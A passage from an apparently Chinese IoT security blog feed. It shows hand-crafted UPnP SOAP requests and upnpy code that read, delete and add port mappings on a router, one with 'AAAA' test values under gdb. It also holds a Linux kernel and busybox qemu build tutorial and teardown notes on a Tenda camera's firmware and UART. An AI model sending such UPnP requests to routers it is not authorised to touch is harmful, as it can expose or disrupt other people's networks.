class="hljs-tag">&lt;/<span class="hljs-name">allowedValue</span>&gt;</span>​      <span class="hljs-tag">&lt;/<span class="hljs-name">allowedValueList</span>&gt;</span>​    <span class="hljs-tag">&lt;/<span class="hljs-name">stateVariable</span>&gt;</span>​    <span class="hljs-tag">&lt;<span class="hljs-name">stateVariable</span>  <span class="hljs-attr">sendEvents</span>=<span class="hljs-string">&quot;no&quot;</span>&gt;</span>​      <span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span>RSIPAvailable<span class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span>​      <span class="hljs-tag">&lt;<span class="hljs-name">dataType</span>&gt;</span>boolean<span class="hljs-tag">&lt;/<span class="hljs-name">dataType</span>&gt;</span>​      <span class="hljs-tag">&lt;<span class="hljs-name">defaultValue</span>&gt;</span>0<span class="hljs-tag">&lt;/<span class="hljs-name">defaultValue</span>&gt;</span>​    <span class="hljs-tag">&lt;/<span class="hljs-name">stateVariable</span>&gt;</span>​    <span class="hljs-tag">&lt;<span class="hljs-name">stateVariable</span>  <span class="hljs-attr">sendEvents</span>=<span class="hljs-string">&quot;no&quot;</span>&gt;</span>​      <span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span>NATEnabled<span class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span>​      <span class="hljs-tag">&lt;<span class="hljs-name">dataType</span>&gt;</span>boolean<span class="hljs-tag">&lt;/<span class="hljs-name">dataType</span>&gt;</span>​      <span class="hljs-tag">&lt;<span class="hljs-name">defaultValue</span>&gt;</span>1<span class="hljs-tag">&lt;/<span class="hljs-name">defaultValue</span>&gt;</span>​    <span class="hljs-tag">&lt;/<span class="hljs-name">stateVariable</span>&gt;</span>​    <span class="hljs-tag">&lt;<span class="hljs-name">stateVariable</span>  <span class="hljs-attr">sendEvents</span>=<span class="hljs-string">&quot;yes&quot;</span>&gt;</span>​      <span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span>ExternalIPAddress<span class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span>​      <span class="hljs-tag">&lt;<span class="hljs-name">dataType</span>&gt;</span>string<span class="hljs-tag">&lt;/<span class="hljs-name">dataType</span>&gt;</span>​    <span class="hljs-tag">&lt;/<span class="hljs-name">stateVariable</span>&gt;</span>​    <span class="hljs-tag">&lt;<span class="hljs-name">stateVariable</span>  <span class="hljs-attr">sendEvents</span>=<span class="hljs-string">&quot;yes&quot;</span>&gt;</span>​      <span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span>PortMappingNumberOfEntries<span class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span>​      <span class="hljs-tag">&lt;<span class="hljs-name">dataType</span>&gt;</span>ui2<span class="hljs-tag">&lt;/<span class="hljs-name">dataType</span>&gt;</span>​    <span class="hljs-tag">&lt;/<span class="hljs-name">stateVariable</span>&gt;</span>​    <span class="hljs-tag">&lt;<span class="hljs-name">stateVariable</span>  <span class="hljs-attr">sendEvents</span>=<span class="hljs-string">&quot;no&quot;</span>&gt;</span>​      <span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span>PortMappingEnabled<span class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span>​      <span class="hljs-tag">&lt;<span class="hljs-name">dataType</span>&gt;</span>boolean<span class="hljs-tag">&lt;/<span class="hljs-name">dataType</span>&gt;</span>​    <span class="hljs-tag">&lt;/<span class="hljs-name">stateVariable</span>&gt;</span>​    <span class="hljs-tag">&lt;<span class="hljs-name">stateVariable</span>  <span class="hljs-attr">sendEvents</span>=<span class="hljs-string">&quot;no&quot;</span>&gt;</span>​      <span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span>PortMappingLeaseDuration<span class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span>​      <span class="hljs-tag">&lt;<span class="hljs-name">dataType</span>&gt;</span>ui4<span class="hljs-tag">&lt;/<span class="hljs-name">dataType</span>&gt;</span>​      <span class="hljs-tag">&lt;<span class="hljs-name">defaultValue</span>&gt;</span>3600<span class="hljs-tag">&lt;/<span class="hljs-name">defaultValue</span>&gt;</span>​      <span class="hljs-tag">&lt;<span class="hljs-name">allowedValueRange</span>&gt;</span>​        <span class="hljs-tag">&lt;<span class="hljs-name">minimum</span>&gt;</span>0<span class="hljs-tag">&lt;/<span class="hljs-name">minimum</span>&gt;</span>​        <span class="hljs-tag">&lt;<span class="hljs-name">maximum</span>&gt;</span>604800<span class="hljs-tag">&lt;/<span class="hljs-name">maximum</span>&gt;</span>​      <span class="hljs-tag">&lt;/<span class="hljs-name">allowedValueRange</span>&gt;</span>​    <span class="hljs-tag">&lt;/<span class="hljs-name">stateVariable</span>&gt;</span>​    <span class="hljs-tag">&lt;<span class="hljs-name">stateVariable</span>  <span class="hljs-attr">sendEvents</span>=<span class="hljs-string">&quot;no&quot;</span>&gt;</span>​      <span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span>RemoteHost<span class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span>​      <span class="hljs-tag">&lt;<span class="hljs-name">dataType</span>&gt;</span>string<span class="hljs-tag">&lt;/<span class="hljs-name">dataType</span>&gt;</span>​    <span class="hljs-tag">&lt;/<span class="hljs-name">stateVariable</span>&gt;</span>​    <span class="hljs-tag">&lt;<span class="hljs-name">stateVariable</span>  <span class="hljs-attr">sendEvents</span>=<span class="hljs-string">&quot;no&quot;</span>&gt;</span>​      <span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span>ExternalPort<span class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span>​      <span class="hljs-tag">&lt;<span class="hljs-name">dataType</span>&gt;</span>ui2<span class="hljs-tag">&lt;/<span class="hljs-name">dataType</span>&gt;</span>​    <span class="hljs-tag">&lt;/<span class="hljs-name">stateVariable</span>&gt;</span>​    <span class="hljs-tag">&lt;<span class="hljs-name">stateVariable</span>  <span class="hljs-attr">sendEvents</span>=<span class="hljs-string">&quot;no&quot;</span>&gt;</span>​      <span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span>InternalPort<span class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span>​      <span class="hljs-tag">&lt;<span class="hljs-name">dataType</span>&gt;</span>ui2<span class="hljs-tag">&lt;/<span class="hljs-name">dataType</span>&gt;</span>​      <span class="hljs-tag">&lt;<span class="hljs-name">allowedValueRange</span>&gt;</span>​        <span class="hljs-tag">&lt;<span class="hljs-name">minimum</span>&gt;</span>1<span class="hljs-tag">&lt;/<span class="hljs-name">minimum</span>&gt;</span>​        <span class="hljs-tag">&lt;<span class="hljs-name">maximum</span>&gt;</span>65535<span class="hljs-tag">&lt;/<span class="hljs-name">maximum</span>&gt;</span>​      <span class="hljs-tag">&lt;/<span class="hljs-name">allowedValueRange</span>&gt;</span>​    <span class="hljs-tag">&lt;/<span class="hljs-name">stateVariable</span>&gt;</span>​    <span class="hljs-tag">&lt;<span class="hljs-name">stateVariable</span>  <span class="hljs-attr">sendEvents</span>=<span class="hljs-string">&quot;no&quot;</span>&gt;</span>​      <span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span>PortMappingProtocol<span class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span>​      <span class="hljs-tag">&lt;<span class="hljs-name">dataType</span>&gt;</span>string<span class="hljs-tag">&lt;/<span class="hljs-name">dataType</span>&gt;</span>​      <span class="hljs-tag">&lt;<span class="hljs-name">allowedValueList</span>&gt;</span>​        <span class="hljs-tag">&lt;<span class="hljs-name">allowedValue</span>&gt;</span>TCP<span class="hljs-tag">&lt;/<span class="hljs-name">allowedValue</span>&gt;</span>​        <span class="hljs-tag">&lt;<span class="hljs-name">allowedValue</span>&gt;</span>UDP<span class="hljs-tag">&lt;/<span class="hljs-name">allowedValue</span>&gt;</span>​      <span class="hljs-tag">&lt;/<span class="hljs-name">allowedValueList</span>&gt;</span>​    <span class="hljs-tag">&lt;/<span class="hljs-name">stateVariable</span>&gt;</span>​    <span class="hljs-tag">&lt;<span class="hljs-name">stateVariable</span>  <span class="hljs-attr">sendEvents</span>=<span class="hljs-string">&quot;no&quot;</span>&gt;</span>​      <span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span>InternalClient<span class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span>​      <span class="hljs-tag">&lt;<span class="hljs-name">dataType</span>&gt;</span>string<span class="hljs-tag">&lt;/<span class="hljs-name">dataType</span>&gt;</span>​    <span class="hljs-tag">&lt;/<span class="hljs-name">stateVariable</span>&gt;</span>​    <span class="hljs-tag">&lt;<span class="hljs-name">stateVariable</span>  <span class="hljs-attr">sendEvents</span>=<span class="hljs-string">&quot;no&quot;</span>&gt;</span>​      <span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span>PortMappingDescription<span class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span>​      <span class="hljs-tag">&lt;<span class="hljs-name">dataType</span>&gt;</span>string<span class="hljs-tag">&lt;/<span class="hljs-name">dataType</span>&gt;</span>​    <span class="hljs-tag">&lt;/<span class="hljs-name">stateVariable</span>&gt;</span>  <span class="hljs-tag">&lt;/<span class="hljs-name">serviceStateTable</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">scpd</span>&gt;</span></code></pre></div><p>分类统计有以下几种：</p><p>SetConnectionType,GetConnectionTypeInfo,RequestConnection,ForceTermination,GetStatusInfo,GetNATRSIPStatus,GetGenericPortMappingEntry,GetSpecificPortMappingEntry,AddPortMapping,DeletePortMapping,GetExternalIPAddress</p><p>通过构造POST请求，访问controlURL：<a href="http://10.0.0.1:56688/ctl/IPConn">http://10.0.0.1:56688/ctl/IPConn</a></p><div class="code-wrapper"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/ctl/IPConn</span> <span class="hljs-meta">HTTP/1.1</span><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>10.0.0.1:56688<span class="hljs-attribute">Upgrade-Insecure-Requests</span><span class="hljs-punctuation">: </span>1<span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36 Edg/116.0.1938.62<span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7<span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate<span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6<span class="hljs-attribute">SOAPAction</span><span class="hljs-punctuation">: </span>&quot;urn:schemas-upnp-org:service:WANIPConnection:1#GetExternalIPAddress&quot;<span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>260<span class="language-vim">&lt;<span class="hljs-variable">s:Envelope</span> xmln<span class="hljs-variable">s:s</span>=<span class="hljs-string">&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;</span> <span class="hljs-variable">s:encodingStyle</span>=<span class="hljs-string">&quot;http://schemas.xmlsoap.org/soap/encoding/&quot;</span>&gt;</span><span class="language-vim">​&lt;<span class="hljs-variable">s:Body</span>&gt;</span><span class="language-vim">​&lt;<span class="hljs-keyword">u</span>:GetExternalIPAddress xmln<span class="hljs-variable">s:u</span>=<span class="hljs-string">&quot;urn:schemas-upnp-org:service:WANIPConnection:1&quot;</span>&gt;</span><span class="language-vim">​&lt;/<span class="hljs-keyword">u</span>:GetExternalIPAddress&gt;</span><span class="language-vim">​&lt;/<span class="hljs-variable">s:Body</span>&gt;</span><span class="language-vim">&lt;/<span class="hljs-variable">s:Envelope</span>&gt;</span></code></pre></div><p>重要的有head中的SOAPAction，构造方式为serviceType#action即：urn:schemas-upnp-org:service:WANIPConnection:1#GetExternalIPAddress</p><p>post参数来源action中的direction为in的参数，如果只有out参数，即可不用构造post参数，直接获取。</p><p>in参数的数据类型在serviceStateTable中可以获取</p><div class="code-wrapper"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/ctl/IPConn</span> <span class="hljs-meta">HTTP/1.1</span><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>identity<span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Python-urllib/3.11<span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>10.0.0.1:56688<span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>358<span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>text/xml; charset=&quot;utf-8&quot;<span class="hljs-attribute">Soapaction</span><span class="hljs-punctuation">: </span>&quot;urn:schemas-upnp-org:service:WANIPConnection:1#DeletePortMapping&quot;<span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<span class="language-xml"></span><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">s:Envelope</span> <span class="hljs-attr">xmlns:s</span>=<span class="hljs-string">&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;</span> <span class="hljs-attr">s:encodingStyle</span>=<span class="hljs-string">&quot;http://schemas.xmlsoap.org/soap/encoding/&quot;</span>&gt;</span></span><span class="language-xml">​<span class="hljs-tag">&lt;<span class="hljs-name">s:Body</span>&gt;</span></span><span class="language-xml">​<span class="hljs-tag">&lt;<span class="hljs-name">u:DeletePortMapping</span> <span class="hljs-attr">xmlns:u</span>=<span class="hljs-string">&quot;urn:schemas-upnp-org:service:WANIPConnection:1&quot;</span>&gt;</span></span><span class="language-xml">​<span class="hljs-tag">&lt;<span class="hljs-name">NewRemoteHost</span>&gt;</span>AAAA<span class="hljs-tag">&lt;/<span class="hljs-name">NewRemoteHost</span>&gt;</span></span><span class="language-xml">​<span class="hljs-tag">&lt;<span class="hljs-name">NewExternalPort</span>&gt;</span>AAAA<span class="hljs-tag">&lt;/<span class="hljs-name">NewExternalPort</span>&gt;</span></span><span class="language-xml">​<span class="hljs-tag">&lt;<span class="hljs-name">NewProtocol</span>&gt;</span>TCP<span class="hljs-tag">&lt;/<span class="hljs-name">NewProtocol</span>&gt;</span></span><span class="language-xml">​<span class="hljs-tag">&lt;/<span class="hljs-name">u:DeletePortMapping</span>&gt;</span></span><span class="language-xml">​<span class="hljs-tag">&lt;/<span class="hljs-name">s:Body</span>&gt;</span></span><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">s:Envelope</span>&gt;</span></span></code></pre></div><p>通过gdb调试可以发现，可以获取到</p><p><img src="https://cdn.jsdelivr.net/gh/p1yang/image@main/image-20230829175431203.png" alt="image-20230829175431203"></p><p>python中又个upnpy库，可以很方便的执行上述步骤。</p><div class="code-wrapper"><pre><code class="hljs bash">python3 -m pip install upnpy</code></pre></div><p>使用方式</p><div class="code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">import</span> upnpy\<span class="hljs-comment">#获取upnp</span>upnp = upnpy.UPnP()\<span class="hljs-comment">#扫描，返回一个设备列表</span>devices = upnp.discover()\<span class="hljs-comment">#确定设备,两种方式都可以</span>devide = devices[<span class="hljs-number">0</span>]device = upnp.get_igd()\<span class="hljs-comment">#获取服务列表</span>services = device.get_services()\<span class="hljs-comment">#确定服务，同两种方式均可</span>service = services[<span class="hljs-number">0</span>] service = device[<span class="hljs-string">&#x27;WANPPPConnection.1&#x27;</span>] <span class="hljs-comment">#service id</span>\<span class="hljs-comment">#获取服务的actions，返回一个action列表</span>service.get_actions()\<span class="hljs-comment">#通过service.action[&#x27;name&#x27;]()可以执行</span>service.GetExternalIPAddress() <span class="hljs-comment">#&#123;&#x27;NewExternalIPAddress&#x27;: &#x27;10.100.40.182&#x27;&#125;</span>\<span class="hljs-comment">#通过service.action[&#x27;name&#x27;].get_input_arguments()可以获取参数</span>service.DeletePortMapping.get_input_arguments()\<span class="hljs-comment">#[&#123;&#x27;name&#x27;: &#x27;NewRemoteHost&#x27;, &#x27;data_type&#x27;: &#x27;string&#x27;, &#x27;allowed_value_list&#x27;: []&#125;, &#123;&#x27;name&#x27;: &#x27;NewExternalPort&#x27;, &#x27;data_type&#x27;: &#x27;ui2&#x27;, &#x27;allowed_value_list&#x27;: []&#125;, &#123;&#x27;name&#x27;: &#x27;NewProtocol&#x27;, &#x27;data_type&#x27;: &#x27;string&#x27;, &#x27;allowed_value_list&#x27;: [&#x27;TCP&#x27;, &#x27;UDP&#x27;]&#125;]</span>\<span class="hljs-comment">#发送服务</span>service.AddPortMapping(  NewRemoteHost=<span class="hljs-string">&#x27;&#x27;</span>,  NewExternalPort=<span class="hljs-number">80</span>,  NewProtocol=<span class="hljs-string">&#x27;TCP&#x27;</span>,  NewInternalPort=<span class="hljs-number">8000</span>,  NewInternalClient=<span class="hljs-string">&#x27;192.168.1.3&#x27;</span>,  NewEnabled=<span class="hljs-number">1</span>,  NewPortMappingDescription=<span class="hljs-string">&#x27;Test port mapping entry from UPnPy.&#x27;</span>,  NewLeaseDuration=<span class="hljs-number">0</span>)</code></pre></div>]]></content>
    
    
    <categories>
      
      <category>iot</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>linux系统编译-x86_64</title>
    <link href="/article/e55c327a.html"/>
    <url>/article/e55c327a.html</url>
    
    <content type="html"><![CDATA[<ol><li>编译Linux内核</li><li>编译busybox</li><li>制作文件系统</li><li>制作根文件系统镜像文件</li><li>利用qemu运行linux内核</li></ol><div class="code-wrapper"><pre><code class="hljs bash"><span class="hljs-comment">#下载需要的工具</span>sudo apt-get install libncurses5-dev flex libelf-dev libssl-dev qemu lzop</code></pre></div><h1 id="编译内核"><a href="#编译内核" class="headerlink" title="编译内核"></a>编译内核</h1><p><a href="http://ftp.sjtu.edu.cn/sites/ftp.kernel.org/pub/linux/kernel/">Index of &#x2F;sites&#x2F;ftp.kernel.org&#x2F;pub&#x2F;linux&#x2F;kernel&#x2F; (sjtu.edu.cn)</a></p><blockquote><p>这里选择版本，从1.0 到 6.0都可以下载，看具体要求</p><p>这里是国内镜像站，源站为<a href="https://kernel.org/">The Linux Kernel Archives</a></p></blockquote><div class="code-wrapper"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="language-bash">下载内核</span>wget http://ftp.sjtu.edu.cn/sites/ftp.kernel.org/pub/linux/kernel/v6.x/linux-6.1.tar.gz<span class="hljs-meta">#</span><span class="language-bash">解压内核</span>tar -vxf linux-6.1.tar.gzcd linux-6.1<span class="hljs-meta">#</span><span class="language-bash">指定架构</span>export ARCH=x86<span class="hljs-meta">#</span><span class="language-bash">配置board config</span>make x86_64_defconfig<span class="hljs-meta">#</span><span class="language-bash">配置内核</span>make menuconfig<span class="hljs-meta">#</span><span class="language-bash">编译</span>make -j8</code></pre></div><blockquote><p>如果要编译其他架构的需要配置工具链 </p></blockquote><div class="code-wrapper"><pre><code class="hljs bash"><span class="hljs-built_in">export</span> CROSS_COMPILE=</code></pre></div><blockquote><p>配置</p></blockquote><div class="code-wrapper"><pre><code class="hljs bash">General setup  ---&gt;       ----&gt; [*] Initial RAM filesystem and RAM disk (initramfs/initrd) support    Device Drivers  ---&gt;       [*] Block devices  ---&gt;               &lt;*&gt;   RAM block device support               (65536) Default RAM disk size (kbytes)</code></pre></div><blockquote><p>图形化配置内核，记得保存再退出</p><p>make -j8 参数是多核编译，告诉编译器同时处理8个编译任务，能大大加快编译速度。</p></blockquote><p>编译好长这样。</p><p><img src="https://cdn.jsdelivr.net/gh/p1yang/image@main/image-20230516104921933.png" alt="image-20230516104921933"></p><h1 id="编译busybox"><a href="#编译busybox" class="headerlink" title="编译busybox"></a>编译busybox</h1><div class="code-wrapper"><pre><code class="hljs bash"><span class="hljs-comment">#下载</span>wget https://busybox.net/downloads/busybox-1.36.0.tar.bz2<span class="hljs-comment">#解压</span>tar -xvf busybox-1.36.0.tar.bz2<span class="hljs-built_in">cd</span> busybox-1.36.0<span class="hljs-comment">#配置 这里要配置静态文件 settings -&gt;  Build static binary (no shared libs)  </span>make menconfig<span class="hljs-comment">#编译</span>make &amp;&amp; make install</code></pre></div><p>配置</p><div class="code-wrapper"><pre><code class="hljs mipsasm"><span class="hljs-keyword">Busybox </span>Settings  ---&gt;      <span class="hljs-keyword">Build </span>Options  ---&gt;            [*] <span class="hljs-keyword">Build </span><span class="hljs-keyword">BusyBox </span>as a static <span class="hljs-keyword">binary </span>(no <span class="hljs-keyword">shared </span>libs)</code></pre></div><p>编译好的busybox在_install 目录下</p><p><img src="https://cdn.jsdelivr.net/gh/p1yang/image@main/image-20230516111650942.png" alt="image-20230516111650942"></p><h1 id="制作文件系统"><a href="#制作文件系统" class="headerlink" title="制作文件系统"></a>制作文件系统</h1><p>直接在_install文件夹下补充必要文件夹</p><div class="code-wrapper"><pre><code class="hljs bash"><span class="hljs-built_in">cd</span> _install<span class="hljs-comment"># -p参数是确保存在</span><span class="hljs-built_in">mkdir</span> -p etc dev mnt proc sys tmp proc sys <span class="hljs-built_in">mkdir</span> -p etc/init.d/<span class="hljs-comment">#当系统启动的时候，系统会自动地从这个文件读取信息，并且会自动将此文件中指定的文件系统挂载到指定的目录。</span><span class="hljs-comment">#详情请看</span>vim etc/fstab  proc        /proc           proc         defaults        0        0  tmpfs       /tmp            tmpfs      defaults        0        0  sysfs       /sys            sysfs        defaults        0        0<span class="hljs-comment"># rcS是一个脚本文件，在inittab文件中本解析调用，用于配置Linux系统。</span>vim etc/init.d/rcS<span class="hljs-built_in">echo</span> -e <span class="hljs-string">&quot;Welcome to linux&quot;</span>/bin/mount -a  <span class="hljs-built_in">echo</span> -e <span class="hljs-string">&quot;Remounting the root filesystem&quot;</span>  mount  -o  remount,rw  /  <span class="hljs-built_in">mkdir</span> -p /dev/pts  mount -t devpts devpts /dev/pts  <span class="hljs-built_in">echo</span> /sbin/mdev &gt; /proc/sys/kernel/hotplug  mdev -s<span class="hljs-built_in">chmod</span> 755 etc/init.d/rcS<span class="hljs-comment"># inittab是Linux系统中的一个配置文件，它定义了系统启动时要执行的进程和服务</span>vim etc/inittab::sysinit:/etc/init.d/rcS::respawn:-/bin/sh::askfirst:-/bin/sh::ctrlaltdel:/bin/umount -a -r<span class="hljs-built_in">chmod</span> 755 etc/inittab<span class="hljs-built_in">cd</span> dev<span class="hljs-comment">#mknod 命令建立一个目录项和一个特殊文件的对应索引节点。</span>sudo <span class="hljs-built_in">mknod</span> console c 5 1sudo <span class="hljs-built_in">mknod</span> null c 1 3sudo <span class="hljs-built_in">mknod</span> tty1 c 4 1</code></pre></div><h1 id="制作根文件系统镜像文件"><a href="#制作根文件系统镜像文件" class="headerlink" title="制作根文件系统镜像文件"></a>制作根文件系统镜像文件</h1><div class="code-wrapper"><pre><code class="hljs bash"><span class="hljs-comment">#从上一步返回到busybox源码文件夹，_install的上层目录</span><span class="hljs-comment">#创建一个32M的文件，内容全部填充为0。</span><span class="hljs-built_in">dd</span> <span class="hljs-keyword">if</span>=/dev/zero of=./rootfs.ext3  bs=1M count=32<span class="hljs-comment">#格式化rootfs.ext3</span>mkfs.ext3 rootfs.ext3<span class="hljs-comment">#创建fs文件夹，将rootfs挂载到fs</span><span class="hljs-built_in">mkdir</span> fssudo mount -o loop rootfs.ext3 ./fs<span class="hljs-comment">#将_install放入fs</span>sudo <span class="hljs-built_in">cp</span> -rf ./_install/* ./fs<span class="hljs-comment">#卸载镜像文件</span>sudo umount ./fs<span class="hljs-comment">#打包镜像</span>gzip --best -c rootfs.ext3 &gt; rootfs.img.gz</code></pre></div><p>这里提供了脚本，可以直接使用</p><div class="code-wrapper"><pre><code class="hljs bash"><span class="hljs-meta">#!/bin/bash</span><span class="hljs-built_in">rm</span> -rf rootfs.ext3<span class="hljs-built_in">rm</span> -rf fs<span class="hljs-built_in">dd</span> <span class="hljs-keyword">if</span>=/dev/zero of=./rootfs.ext3 bs=1M count=32mkfs.ext3 rootfs.ext3<span class="hljs-built_in">mkdir</span> fsmount -o loop rootfs.ext3 ./fs<span class="hljs-built_in">cp</span> -rf ./_install/* ./fsumount ./fsgzip --best -c rootfs.ext3 &gt; rootfs.img.gz</code></pre></div><h1 id="使用qemu运行内核"><a href="#使用qemu运行内核" class="headerlink" title="使用qemu运行内核"></a>使用qemu运行内核</h1><div class="code-wrapper"><pre><code class="hljs bash">qemu-system-x86_64 -kernel ./linux-4.9.229/arch/x86_64/boot/bzImage -initrd ./busybox-1.30.0/rootfs.img.gz -append <span class="hljs-string">&quot;root=/dev/ram init=/linuxrc console=ttyS0&quot;</span> -serial file:output.txt -nographic</code></pre></div>]]></content>
    
    
    <categories>
      
      <category>一些杂七杂八的技术</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>tendacp3</title>
    <link href="/article/e3065a82.html"/>
    <url>/article/e3065a82.html</url>
    
    <content type="html"><![CDATA[<p>这里就先不放设备照片了，诸位可以自己在该页面寻找下设备型号。</p><p>这款路由器是通过云端进行数据传输的，即 摄像头 &#x3D; 云端 &#x3D; 手机，无web页面，且并未发现摄像头与手机直接通信。</p><h2 id="摄像头"><a href="#摄像头" class="headerlink" title="摄像头"></a>摄像头</h2><p><img src="https://cdn.jsdelivr.net/gh/p1yang/image/IMG_0338.jpeg" alt="IMG_0338"></p><p>前边这个黄色印字的pcb我并没有查出来具体是做什么的，但是我看这个设备介绍是有高清夜视能力的，我猜是这么个功能，不重要。</p><p><img src="https://cdn.jsdelivr.net/gh/p1yang/image/image-20220715093743157.png" alt="image-20220715093743157"></p><p>使用了上海富瀚的FH8626V100，下面是各种文档，详细文档我没找到。</p><blockquote><p><a href="https://www.fullhan.com/index.php?c=article&amp;id=221">https://www.fullhan.com/index.php?c=article&amp;id=221</a></p><p><a href="https://www.fullhan.com/uploads/2021/11/163669725327888.pdf">https://www.fullhan.com/uploads/2021/11/163669725327888.pdf</a></p><p><a href="https://blog.csdn.net/xue_nuo/article/details/125717256?utm_medium=distribute.pc_relevant.none-task-blog-2~default~baidujs_title~default-0-125717256-blog-122374192.pc_relevant_multi_platform_whitelistv2&amp;spm=1001.2101.3001.4242.1&amp;utm_relevant_index=3">https://blog.csdn.net/xue_nuo/article/details/125717256?utm_medium=distribute.pc_relevant.none-task-blog-2~default~baidujs_title~default-0-125717256-blog-122374192.pc_relevant_multi_platform_whitelistv2&amp;spm=1001.2101.3001.4242.1&amp;utm_relevant_index=3</a></p><p><a href="https://blog.csdn.net/xue_nuo/article/details/122374192">https://blog.csdn.net/xue_nuo/article/details/122374192</a></p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/p1yang/image/IMG_0371.jpeg" alt="IMG_0371"></p><p>flash 为H25S64，从查出来的资料来看是8m的，很遗憾的是我的ch341a并不支持这个型号的闪存，所以提取写入固件操作也办不到。</p><p>只能吧信息放到这了，原谅我硬件知识的匮乏。</p><h2 id="固件"><a href="#固件" class="headerlink" title="固件"></a>固件</h2><p>这里因为flash型号的问题我没办法从固件提取，但是官网可以直接获取，且并没有加密。</p><p><img src="https://cdn.jsdelivr.net/gh/p1yang/image/image-20220715102403033.png" alt="image-20220715102403033"></p><p>squashfs 文件系统，但解包出来的文件系统在cpio文件中。</p><p><img src="https://cdn.jsdelivr.net/gh/p1yang/image/image-20220715110812734.png" alt="image-20220715110812734"></p><p>但涉及到一部分的文件还是在squashfs-root中</p><p><img src="https://cdn.jsdelivr.net/gh/p1yang/image/image-20220715111032612.png" alt="image-20220715111032612"></p><p>只有一个root账户默认开启。密码并没有爆破出来。</p><p>通过rcS文件的分析和对uart的输出信息来看，主要为两个服务 noodles 和apollo。后边会有分析。</p><p><img src="https://cdn.jsdelivr.net/gh/p1yang/image/image-20220715113120175.png" alt="image-20220715113120175"></p><p>文件格式为32位arm小端序</p><p><img src="https://cdn.jsdelivr.net/gh/p1yang/image/image-20220715112602198.png" alt="image-20220715112602198"></p><h2 id="uart"><a href="#uart" class="headerlink" title="uart"></a>uart</h2><p>该设备有uart接口，并且将每个用处都标注出来了。但是是被堵上的，需要将杜邦线焊接上去。</p><p>（请忽略我的焊接技术，我真没学过）</p><p><img src="https://cdn.jsdelivr.net/gh/p1yang/image/IMG_0342.jpeg" alt="IMG_0342"></p><p>波特率为115200，tenda好多设备都都是这个。</p><p>下面是通过打印获取到的一些信息。</p><p><img src="https://cdn.jsdelivr.net/gh/p1yang/image/image-20220715143628881.png" alt="image-20220715143628881"></p><p>这里理论上摁E可以不使用自动启动，但我没有成功。</p><p><img src="https://cdn.jsdelivr.net/gh/p1yang/image/image-20220715144742789.png" alt="image-20220715144742789"></p><p>linux内核</p><p><img src="https://cdn.jsdelivr.net/gh/p1yang/image/image-20220715145126558.png" alt="image-20220715145126558"></p><p>可以看到cpu相关的sdk。</p><p><img src="https://cdn.jsdelivr.net/gh/p1yang/image/image-20220715145228397.png" alt="image-20220715145228397"></p><p>两个服务的启动。noodles 和 apollo，前面提到过</p><p>noodles监听了1300端口，但我并没有找到任何关于这个服务的相关信息。</p><p>apollo应该是apache apollo服务</p><blockquote><p>Apache Apollo是一个代理服务器，其是在ActiveMQ基础上发展而来的，可以支持STOMP, AMQP, MQTT, Openwire, SSL, and WebSockets 等多种协议。</p><p><a href="https://www.freesion.com/article/41891296353/">https://www.freesion.com/article/41891296353/</a></p></blockquote><p>之后尝试逆向分析。</p><hr><p>上次的坑来填了</p><p>之前没有系统学习过网络编程，花了一周时间把tinyhttpd的源代码阅读理解了一下，并且仿照用python写了一个简易的httpd，可以看我另一篇文章</p><h2 